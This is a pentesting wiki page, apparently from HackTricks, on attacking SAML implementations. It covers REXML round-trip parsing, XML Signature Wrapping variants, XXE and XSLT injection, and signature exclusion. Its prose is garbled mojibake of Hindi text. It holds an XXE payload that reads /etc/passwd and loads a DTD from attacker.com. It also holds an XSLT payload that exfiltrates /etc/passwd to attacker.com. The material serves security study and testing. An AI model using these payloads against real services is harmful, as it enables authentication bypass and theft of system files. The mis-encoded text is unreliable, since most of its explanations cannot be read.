# SAML Attacks

## SAML Attacks

{% hint style="success" %}
AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдБ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* **рд╣рдорд╛рд░реЗ** ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**telegram рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ **Twitter** ЁЯРж рдкрд░ рд╣рдореЗрдВ **рдлреЙрд▓реЛ рдХрд░реЗрдВ** [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░ [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░реЗрдВред

</details>
{% endhint %}

## Basic Information

{% content-ref url="saml-basics.md" %}
[saml-basics.md](saml-basics.md)
{% endcontent-ref %}

## Tool

[**SAMLExtractor**](https://github.com/fadyosman/SAMLExtractor): рдПрдХ рдЙрдкрдХрд░рдг рдЬреЛ рдПрдХ URL рдпрд╛ URL рдХреА рд╕реВрдЪреА рд▓реЗ рд╕рдХрддрд╛ рд╣реИ рдФрд░ SAML рдЙрдкрднреЛрдЧ URL рдХреЛ рд╡рд╛рдкрд╕ рдкреНрд░рд┐рдВрдЯ рдХрд░рддрд╛ рд╣реИред

## XML round-trip

XML рдореЗрдВ XML рдХрд╛ рд╣рд╕реНрддрд╛рдХреНрд╖рд░рд┐рдд рднрд╛рдЧ рдореЗрдореЛрд░реА рдореЗрдВ рд╕рд╣реЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдлрд┐рд░ рдХреБрдЫ рдПрдиреНрдХреЛрдбрд┐рдВрдЧ/рдбрд┐рдХреЛрдбрд┐рдВрдЧ рдХреА рдЬрд╛рддреА рд╣реИ рдФрд░ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХреА рдЬрд╛рдВрдЪ рдХреА рдЬрд╛рддреА рд╣реИред рдЖрджрд░реНрд╢ рд░реВрдк рд╕реЗ, рдЙрд╕ рдПрдиреНрдХреЛрдбрд┐рдВрдЧ/рдбрд┐рдХреЛрдбрд┐рдВрдЧ рдХреЛ рдбреЗрдЯрд╛ рдХреЛ рдирд╣реАрдВ рдмрджрд▓рдирд╛ рдЪрд╛рд╣рд┐рдП рд▓реЗрдХрд┐рди рдЙрд╕ рдкрд░рд┐рджреГрд╢реНрдп рдХреЗ рдЖрдзрд╛рд░ рдкрд░, **рдЬрд╛рдВрдЪ рдХреА рдЬрд╛ рд░рд╣реА рдбреЗрдЯрд╛ рдФрд░ рдореВрд▓ рдбреЗрдЯрд╛ рд╕рдорд╛рди рдирд╣реАрдВ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ**ред

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛрдб рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ:
```ruby
require 'rexml/document'

doc = REXML::Document.new <<XML
<!DOCTYPE x [ <!NOTATION x SYSTEM 'x">]><!--'> ]>
<X>
<Y/><![CDATA[--><X><Z/><!--]]>-->
</X>
XML

puts "First child in original doc: " + doc.root.elements[1].name
doc = REXML::Document.new doc.to_s
puts "First child after round-trip: " + doc.root.elements[1].name
```
REXML 3.2.4 рдпрд╛ рдЙрд╕рд╕реЗ рдкрд╣рд▓реЗ рдХреЗ рд╕рдВрд╕реНрдХрд░рдг рдХреЗ рдЦрд┐рд▓рд╛рдл рдкреНрд░реЛрдЧреНрд░рд╛рдо рдЪрд▓рд╛рдиреЗ рдкрд░ рдЗрд╕рдХреЗ рдмрдЬрд╛рдп рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЖрдЙрдЯрдкреБрдЯ рдкреНрд░рд╛рдкреНрдд рд╣реЛрдЧрд╛:
```
First child in original doc: Y
First child after round-trip: Z
```
рдпрд╣рд╛рдБ рдмрддрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ рдХрд┐ REXML рдиреЗ рдКрдкрд░ рджрд┐рдП рдЧрдП рдкреНрд░реЛрдЧреНрд░рд╛рдо рд╕реЗ рдореВрд▓ XML рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдХреЛ рдХреИрд╕реЗ рджреЗрдЦрд╛:

![https://mattermost.com/blog/securing-xml-implementations-across-the-web/](<../../.gitbook/assets/image (1001).png>)

рдФрд░ рдпрд╣ рд╣реИ рдХрд┐ рдЗрд╕реЗ рдкрд╛рд░реНрд╕рд┐рдВрдЧ рдФрд░ рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬреЗрд╢рди рдХреЗ рдПрдХ рджреМрд░ рдХреЗ рдмрд╛рдж рдХреИрд╕реЗ рджреЗрдЦрд╛ рдЧрдпрд╛:

![https://mattermost.com/blog/securing-xml-implementations-across-the-web/](<../../.gitbook/assets/image (445).png>)

рдХрдордЬреЛрд░реА рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдФрд░ рдЗрд╕рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХреИрд╕реЗ рдХрд░реЗрдВ:

* [https://mattermost.com/blog/securing-xml-implementations-across-the-web/](https://mattermost.com/blog/securing-xml-implementations-across-the-web/)
* [https://joonas.fi/2021/08/saml-is-insecure-by-design/](https://joonas.fi/2021/08/saml-is-insecure-by-design/)

## XML Signature Wrapping Attacks

**XML Signature Wrapping attacks (XSW)** рдореЗрдВ, рдкреНрд░рддрд┐рдХреВрд▓ рдкрдХреНрд╖ рдПрдХ рдХрдордЬреЛрд░реА рдХрд╛ рд▓рд╛рдн рдЙрдард╛рддреЗ рд╣реИрдВ рдЬреЛ рддрдм рдЙрддреНрдкрдиреНрди рд╣реЛрддреА рд╣реИ рдЬрдм XML рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реЛрдВ рдХреЛ рджреЛ рдЕрд▓рдЧ-рдЕрд▓рдЧ рдЪрд░рдгреЛрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕рдВрд╕рд╛рдзрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ: **signature validation** рдФрд░ **function invocation**ред рдпреЗ рд╣рдорд▓реЗ XML рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рд╕рдВрд░рдЪрдирд╛ рдХреЛ рдмрджрд▓рдиреЗ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрддреЗ рд╣реИрдВред рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ, рд╣рдорд▓рд╛рд╡рд░ **рдЬрд╛рд▓реА рддрддреНрд╡реЛрдВ рдХреЛ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рддрд╛ рд╣реИ** рдЬреЛ XML Signature рдХреА рд╡реИрдзрддрд╛ рдХреЛ рдкреНрд░рднрд╛рд╡рд┐рдд рдирд╣реАрдВ рдХрд░рддреЗред рдпрд╣ рд╣реЗрд░рдлреЗрд░ **application logic** рджреНрд╡рд╛рд░рд╛ рд╡рд┐рд╢реНрд▓реЗрд╖рд┐рдд рддрддреНрд╡реЛрдВ рдФрд░ **signature verification module** рджреНрд╡рд╛рд░рд╛ рдЬрд╛рдВрдЪреЗ рдЧрдП рддрддреНрд╡реЛрдВ рдХреЗ рдмреАрдЪ рдПрдХ рд╡рд┐рд╕рдВрдЧрддрд┐ рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣реИред рдкрд░рд┐рдгрд╛рдорд╕реНрд╡рд░реВрдк, рдЬрдмрдХрд┐ XML Signature рддрдХрдиреАрдХреА рд░реВрдк рд╕реЗ рд╡реИрдз рд░рд╣рддрд╛ рд╣реИ рдФрд░ рд╕рддреНрдпрд╛рдкрди рдкрд╛рд╕ рдХрд░рддрд╛ рд╣реИ, рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд▓реЙрдЬрд┐рдХ **рдзреЛрдЦрд╛рдзрдбрд╝реА рд╡рд╛рд▓реЗ рддрддреНрд╡реЛрдВ** рдХреЛ рд╕рдВрд╕рд╛рдзрд┐рдд рдХрд░рддрд╛ рд╣реИред рдЗрд╕ рдкреНрд░рдХрд╛рд░, рд╣рдорд▓рд╛рд╡рд░ рдкреНрд░рднрд╛рд╡реА рд░реВрдк рд╕реЗ XML Signature рдХреА **integrity protection** рдФрд░ **origin authentication** рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ **arbitrary content** рдХрд╛ рдЗрдВрдЬреЗрдХреНрд╢рди рдмрд┐рдирд╛ рдХрд┐рд╕реА рдкрд╣рдЪрд╛рди рдХреЗ рд╕рдВрднрд╡ рд╣реЛ рдЬрд╛рддрд╛ рд╣реИред

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╣рдорд▓реЗ [**рдЗрд╕ рдмреНрд▓реЙрдЧ рдкреЛрд╕реНрдЯ**](https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/) **рдФрд░** [**рдЗрд╕ рдкреЗрдкрд░**](https://www.usenix.org/system/files/conference/usenixsecurity12/sec12-final91.pdf) рдкрд░ рдЖрдзрд╛рд░рд┐рдд рд╣реИрдВред рдЗрд╕рд▓рд┐рдП рдЖрдЧреЗ рдХреА рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рдЙрдиреНрд╣реЗрдВ рджреЗрдЦреЗрдВред

### XSW #1

* **Strategy**: рдПрдХ рдирдпрд╛ рд░реВрдЯ рддрддреНрд╡ рдЬрд┐рд╕рдореЗрдВ рд╕рд┐рдЧреНрдиреЗрдЪрд░ рд╢рд╛рдорд┐рд▓ рд╣реИ рдЬреЛрдбрд╝рд╛ рдЧрдпрд╛ рд╣реИред
* **Implication**: рд╡реЗрд▓рд┐рдбреЗрдЯрд░ рд╡реИрдз "Response -> Assertion -> Subject" рдФрд░ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ "evil new Response -> Assertion -> Subject" рдХреЗ рдмреАрдЪ рднреНрд░рдорд┐рдд рд╣реЛ рд╕рдХрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдбреЗрдЯрд╛ рдЗрдВрдЯреАрдЧреНрд░рд┐рдЯреА рд╕рдорд╕реНрдпрд╛рдПрдБ рдЙрддреНрдкрдиреНрди рд╣реЛ рд╕рдХрддреА рд╣реИрдВред

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-1.svg](<../../.gitbook/assets/image (506).png>)

### XSW #2

* **Difference from XSW #1**: рдПрдХ рдПрдиреНрд╡реЗрд▓рдкрд┐рдВрдЧ рд╕рд┐рдЧреНрдиреЗрдЪрд░ рдХреЗ рдмрдЬрд╛рдп рдПрдХ рдбрд┐рдЯреИрдЪреНрдб рд╕рд┐рдЧреНрдиреЗрдЪрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред
* **Implication**: "evil" рд╕рдВрд░рдЪрдирд╛, XSW #1 рдХреЗ рд╕рдорд╛рди, рдЗрдВрдЯреАрдЧреНрд░рд┐рдЯреА рдЪреЗрдХ рдХреЗ рдмрд╛рдж рд╡реНрдпрд╡рд╕рд╛рдпрд┐рдХ рд▓реЙрдЬрд┐рдХ рдХреЛ рдзреЛрдЦрд╛ рджреЗрдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рддреА рд╣реИред

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-2.svg](<../../.gitbook/assets/image (466).png>)

### XSW #3

* **Strategy**: рдПрдХ evil Assertion рдХреЛ рдореВрд▓ assertion рдХреЗ рд╕рдорд╛рди рд╕реНрддрд░ рдкрд░ рддреИрдпрд╛рд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред
* **Implication**: рд╡реНрдпрд╡рд╕рд╛рдпрд┐рдХ рд▓реЙрдЬрд┐рдХ рдХреЛ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг рдбреЗрдЯрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рднреНрд░рдорд┐рдд рдХрд░рдиреЗ рдХрд╛ рдЗрд░рд╛рджрд╛ рд╣реИред

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-3.svg](<../../.gitbook/assets/image (120).png>)

### XSW #4

* **Difference from XSW #3**: рдореВрд▓ Assertion рдПрдХ рдбреБрдкреНрд▓рд┐рдХреЗрдЯ (evil) Assertion рдХрд╛ рдмрдЪреНрдЪрд╛ рдмрди рдЬрд╛рддрд╛ рд╣реИред
* **Implication**: XSW #3 рдХреЗ рд╕рдорд╛рди рд▓реЗрдХрд┐рди XML рд╕рдВрд░рдЪрдирд╛ рдХреЛ рдЕрдзрд┐рдХ рдЖрдХреНрд░рд╛рдордХрддрд╛ рд╕реЗ рдмрджрд▓рддрд╛ рд╣реИред

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-4.svg](<../../.gitbook/assets/image (551).png>)

### XSW #5

* **Unique Aspect**: рди рддреЛ Signature рдФрд░ рди рд╣реА рдореВрд▓ Assertion рдорд╛рдирдХ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди (enveloped/enveloping/detached) рдХрд╛ рдкрд╛рд▓рди рдХрд░рддреЗ рд╣реИрдВред
* **Implication**: рдХреЙрдкреА рдХрд┐рдпрд╛ рдЧрдпрд╛ Assertion Signature рдХреЛ рдПрдиреНрд╡реЗрд▓рдк рдХрд░рддрд╛ рд╣реИ, рдЕрдкреЗрдХреНрд╖рд┐рдд рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рд╕рдВрд░рдЪрдирд╛ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рддрд╛ рд╣реИред

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-5.svg](<../../.gitbook/assets/image (1030).png>)

### XSW #6

* **Strategy**: XSW #4 рдФрд░ #5 рдХреЗ рд╕рдорд╛рди рд╕реНрдерд╛рди рд╕рдореНрдорд┐рд▓рди, рд▓реЗрдХрд┐рди рдПрдХ рдореЛрдбрд╝ рдХреЗ рд╕рд╛рдеред
* **Implication**: рдХреЙрдкреА рдХрд┐рдпрд╛ рдЧрдпрд╛ Assertion Signature рдХреЛ рдПрдиреНрд╡реЗрд▓рдк рдХрд░рддрд╛ рд╣реИ, рдЬреЛ рдлрд┐рд░ рдореВрд▓ Assertion рдХреЛ рдПрдиреНрд╡реЗрд▓рдк рдХрд░рддрд╛ рд╣реИ, рдПрдХ рдиреЗрд╕реНрдЯреЗрдб рдзреЛрдЦрд╛рдзрдбрд╝реА рд╕рдВрд░рдЪрдирд╛ рдмрдирд╛рддрд╛ рд╣реИред

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-6.svg](<../../.gitbook/assets/image (169).png>)

### XSW #7

* **Strategy**: рдПрдХ Extensions рддрддреНрд╡ рдХреЛ рдХреЙрдкреА рдХрд┐рдП рдЧрдП Assertion рдХреЗ рдмрдЪреНрдЪреЗ рдХреЗ рд░реВрдк рдореЗрдВ рд╕рдореНрдорд┐рд▓рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
* **Implication**: рдпрд╣ Extensions рддрддреНрд╡ рдХреА рдХрдо рдкреНрд░рддрд┐рдмрдВрдзрд╛рддреНрдордХ рд╕реНрдХреАрдорд╛ рдХрд╛ рд▓рд╛рдн рдЙрдард╛рддрд╛ рд╣реИ рддрд╛рдХрд┐ рд╕реНрдХреАрдорд╛ рд╕рддреНрдпрд╛рдкрди рдкреНрд░рддрд┐рд░реЛрдзреЛрдВ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ, рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ OpenSAML рдЬреИрд╕реА рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдореЗрдВред

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-7.svg](<../../.gitbook/assets/image (971).png>)

### XSW #8

* **Difference from XSW #7**: рд╣рдорд▓реЗ рдХреЗ рдПрдХ рд░реВрдкрд╛рдВрддрд░ рдХреЗ рд▓рд┐рдП рдПрдХ рдФрд░ рдХрдо рдкреНрд░рддрд┐рдмрдВрдзрд╛рддреНрдордХ XML рддрддреНрд╡ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред
* **Implication**: рдореВрд▓ Assertion рдХрдо рдкреНрд░рддрд┐рдмрдВрдзрд╛рддреНрдордХ рддрддреНрд╡ рдХрд╛ рдмрдЪреНрдЪрд╛ рдмрди рдЬрд╛рддрд╛ рд╣реИ, XSW #7 рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХреА рдЧрдИ рд╕рдВрд░рдЪрдирд╛ рдХреЛ рдЙрд▓рдЯрддрд╛ рд╣реИред

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-8.svg](<../../.gitbook/assets/image (541).png>)

### Tool

рдЖрдк рдЕрдиреБрд░реЛрдз рдХреЛ рдкрд╛рд░реНрд╕ рдХрд░рдиреЗ, рдХреЛрдИ рднреА XSW рд╣рдорд▓рд╛ рд▓рд╛рдЧреВ рдХрд░рдиреЗ рдФрд░ рдЗрд╕реЗ рд▓реЙрдиреНрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП Burp рдПрдХреНрд╕рдЯреЗрдВрд╢рди [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

## XXE

рдпрджрд┐ рдЖрдк рдирд╣реАрдВ рдЬрд╛рдирддреЗ рдХрд┐ XXE рд╣рдорд▓реЗ рдХрд┐рд╕ рдкреНрд░рдХрд╛рд░ рдХреЗ рд╣реЛрддреЗ рд╣реИрдВ, рддреЛ рдХреГрдкрдпрд╛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреГрд╖реНрда рдкрдврд╝реЗрдВ:

{% content-ref url="../xxe-xee-xml-external-entity.md" %}
[xxe-xee-xml-external-entity.md](../xxe-xee-xml-external-entity.md)
{% endcontent-ref %}

SAML Responses **deflated рдФрд░ base64 encoded XML рджрд╕реНрддрд╛рд╡реЗрдЬрд╝** рд╣реЛрддреЗ рд╣реИрдВ рдФрд░ XML External Entity (XXE) рд╣рдорд▓реЛрдВ рдХреЗ рдкреНрд░рддрд┐ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВред SAML Response рдХреА XML рд╕рдВрд░рдЪрдирд╛ рдореЗрдВ рд╣реЗрд░рдлреЗрд░ рдХрд░рдХреЗ, рд╣рдорд▓рд╛рд╡рд░ XXE рдХрдордЬреЛрд░рд┐рдпреЛрдВ рдХрд╛ рд▓рд╛рдн рдЙрдард╛рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдпрд╣рд╛рдБ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХреЗ рд╣рдорд▓реЗ рдХреЛ рдХреИрд╕реЗ рджреЗрдЦрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY    file SYSTEM "file:///etc/passwd">
<!ENTITY dtd SYSTEM "http://www.attacker.com/text.dtd" >]>
<samlp:Response ... ID="_df55c0bb940c687810b436395cf81760bb2e6a92f2" ...>
<saml:Issuer>...</saml:Issuer>
<ds:Signature ...>
<ds:SignedInfo>
<ds:CanonicalizationMethod .../>
<ds:SignatureMethod .../>
<ds:Reference URI="#_df55c0bb940c687810b436395cf81760bb2e6a92f2">...</ds:Reference>
</ds:SignedInfo>
<ds:SignatureValue>...</ds:SignatureValue>
[...]
```
## Tools

рдЖрдк Burp рдПрдХреНрд╕рдЯреЗрдВрд╢рди [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ SAML рдЕрдиреБрд░реЛрдз рд╕реЗ POC рдЙрддреНрдкрдиреНрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рд╕рдВрднрд╛рд╡рд┐рдд XXE рдХрдордЬреЛрд░рд┐рдпреЛрдВ рдФрд░ SAML рдХрдордЬреЛрд░рд┐рдпреЛрдВ рдХрд╛ рдкрд░реАрдХреНрд╖рдг рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред

рдЗрд╕ рд╡рд╛рд░реНрддрд╛ рдХреЛ рднреА рджреЗрдЦреЗрдВ: [https://www.youtube.com/watch?v=WHn-6xHL7mI](https://www.youtube.com/watch?v=WHn-6xHL7mI)

## XSLT via SAML

XSLT рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рдЬрд╛рдПрдВ:

{% content-ref url="../xslt-server-side-injection-extensible-stylesheet-language-transformations.md" %}
[xslt-server-side-injection-extensible-stylesheet-language-transformations.md](../xslt-server-side-injection-extensible-stylesheet-language-transformations.md)
{% endcontent-ref %}

Extensible Stylesheet Language Transformations (XSLT) рдХрд╛ рдЙрдкрдпреЛрдЧ XML рджрд╕реНрддрд╛рд╡реЗрдЬреЛрдВ рдХреЛ HTML, JSON, рдпрд╛ PDF рдЬреИрд╕реЗ рд╡рд┐рднрд┐рдиреНрди рдкреНрд░рд╛рд░реВрдкреЛрдВ рдореЗрдВ рдкрд░рд┐рд╡рд░реНрддрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИ рдХрд┐ **XSLT рдкрд░рд┐рд╡рд░реНрддрдиреЛрдВ рдХреЛ рдбрд┐рдЬрд┐рдЯрд▓ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХреЗ рд╕рддреНрдпрд╛рдкрди рд╕реЗ рдкрд╣рд▓реЗ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**ред рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдПрдХ рд╣рдорд▓рд╛ рд╕рдлрд▓ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рднрд▓реЗ рд╣реА рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдорд╛рдиреНрдп рди рд╣реЛ; рдПрдХ рд╕реНрд╡-рд╣рд╕реНрддрд╛рдХреНрд╖рд░рд┐рдд рдпрд╛ рдЕрдорд╛рдиреНрдп рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдЖрдЧреЗ рдмрдврд╝рдиреЗ рдХреЗ рд▓рд┐рдП рдкрд░реНрдпрд╛рдкреНрдд рд╣реИред

рдпрд╣рд╛рдВ рдЖрдк рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХреА рдХрдордЬреЛрд░рд┐рдпреЛрдВ рдХреА рдЬрд╛рдВрдЪ рдХреЗ рд▓рд┐рдП рдПрдХ **POC** рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ, рд╣реИрдХреНрдЯреНрд░рд┐рдХреНрд╕ рдкреГрд╖реНрда рдореЗрдВ рдЬреЛ рдЗрд╕ рдЕрдиреБрднрд╛рдЧ рдХреА рд╢реБрд░реБрдЖрдд рдореЗрдВ рдЙрд▓реНрд▓реЗрдЦрд┐рдд рд╣реИ, рдЖрдк рдкреЗрд▓реЛрдбреНрд╕ рдХреЗ рд▓рд┐рдП рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВред
```xml
<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
...
<ds:Transforms>
<ds:Transform>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="doc">
<xsl:variable name="file" select="unparsed-text('/etc/passwd')"/>
<xsl:variable name="escaped" select="encode-for-uri($file)"/>
<xsl:variable name="attackerUrl" select="'http://attacker.com/'"/>
<xsl:variable name="exploitUrl" select="concat($attackerUrl,$escaped)"/>
<xsl:value-of select="unparsed-text($exploitUrl)"/>
</xsl:template>
</xsl:stylesheet>
</ds:Transform>
</ds:Transforms>
...
</ds:Signature>
```
### Tool

рдЖрдк Burp рдПрдХреНрд╕рдЯреЗрдВрд╢рди [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ SAML рдЕрдиреБрд░реЛрдз рд╕реЗ POC рдЙрддреНрдкрдиреНрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рд╕рдВрднрд╛рд╡рд┐рдд XSLT рдХрдордЬреЛрд░рд┐рдпреЛрдВ рдХрд╛ рдкрд░реАрдХреНрд╖рдг рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред

рдЗрд╕ рд╡рд╛рд░реНрддрд╛ рдХреЛ рднреА рджреЗрдЦреЗрдВ: [https://www.youtube.com/watch?v=WHn-6xHL7mI](https://www.youtube.com/watch?v=WHn-6xHL7mI)

## XML Signature Exclusion <a href="#xml-signature-exclusion" id="xml-signature-exclusion"></a>

**XML Signature Exclusion** SAML рдХрд╛рд░реНрдпрд╛рдиреНрд╡рдпрди рдХреЗ рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд╛ рдЕрд╡рд▓реЛрдХрди рдХрд░рддрд╛ рд╣реИ рдЬрдм Signature рддрддреНрд╡ рдЕрдиреБрдкрд╕реНрдерд┐рдд рд╣реЛрддрд╛ рд╣реИред рдпрджрд┐ рдпрд╣ рддрддреНрд╡ рдЧрд╛рдпрдм рд╣реИ, рддреЛ **signature validation рдирд╣реАрдВ рд╣реЛ рд╕рдХрддрд╛**, рдЬрд┐рд╕рд╕реЗ рдпрд╣ рдХрдордЬреЛрд░ рд╣реЛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕реЗ рдкрд░реАрдХреНрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрди рд╕рд╛рдордЧреНрд░реА рдХреЛ рдмрджрд▓рдирд╛ рд╕рдВрднрд╡ рд╣реИ рдЬреЛ рдЖрдорддреМрд░ рдкрд░ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рджреНрд╡рд╛рд░рд╛ рд╕рддреНрдпрд╛рдкрд┐рдд рдХреА рдЬрд╛рддреА рд╣реИрдВред

![https://epi052.gitlab.io/notes-to-self/img/saml/signature-exclusion.svg](<../../.gitbook/assets/image (457).png>)

### Tool <a href="#xml-signature-exclusion-how-to" id="xml-signature-exclusion-how-to"></a>

рдЖрдк Burp рдПрдХреНрд╕рдЯреЗрдВрд╢рди [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред SAML Response рдХреЛ рдЗрдВрдЯрд░рд╕реЗрдкреНрдЯ рдХрд░реЗрдВ рдФрд░ `Remove Signatures` рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВред рдРрд╕рд╛ рдХрд░рдиреЗ рдкрд░ **рд╕рднреА** Signature рддрддреНрд╡ рд╣рдЯрд╛ рджрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВред

